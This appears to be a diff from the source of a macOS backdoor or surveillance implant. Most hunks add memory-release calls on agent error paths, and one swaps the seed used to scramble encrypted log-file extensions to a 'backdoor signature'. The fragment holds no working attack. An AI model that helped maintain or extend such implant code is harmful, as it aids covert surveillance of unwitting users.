@@ -376,7 +376,7 @@ static NSLock *gSyncLock                  = nil;
           //
           NSString *encryptedLogExtension = [[mConfigManager encryption] 
                                              scrambleForward: NEWCONF
-                                                        seed: gChallenge[0]];
+                                                        seed: gBackdoorSignature[0]];
           
           NSArray *logFiles = searchFile(encryptedLogExtension);
           
@@ -707,7 +707,9 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG
                     NSLog(@"Error while sending start command to the agent");
 #endif
-
+                    
+                    [agentCommand release];
+                    [agentConfiguration release];
                     return NO;
                   }
               }
@@ -755,7 +757,9 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG
                     NSLog(@"An error occurred while starting agent URL");
 #endif
-
+                    
+                    [agentCommand release];
+                    [agentConfiguration release];
                     return NO;
                   }
               }
@@ -812,6 +816,7 @@ static NSLock *gSyncLock                  = nil;
                     NSLog(@"An error occurred while starting agent URL");
 #endif
                     
+                    [agentCommand release];
                     return NO;
                   }
               }
@@ -855,7 +860,9 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG
                     NSLog(@"An error occurred while starting agent URL");
 #endif
-                  
+                    
+                    [agentCommand release];
+                    [agentConfiguration release];
                     return NO;
                   }
               }
@@ -900,7 +907,9 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG
                     NSLog(@"Error while sending start command to the agent");
 #endif
-
+                    
+                    [agentCommand release];
+                    [agentConfiguration release];
                     return NO;
                   }
               }
@@ -961,7 +970,10 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG
                     NSLog(@"An error occurred while starting agent URL");
 #endif
-                  
+                    
+                    [agentCommand release];
+                    [agentConfiguration release];
+                    [voipConfig release];
                     return NO;
                   }
               }
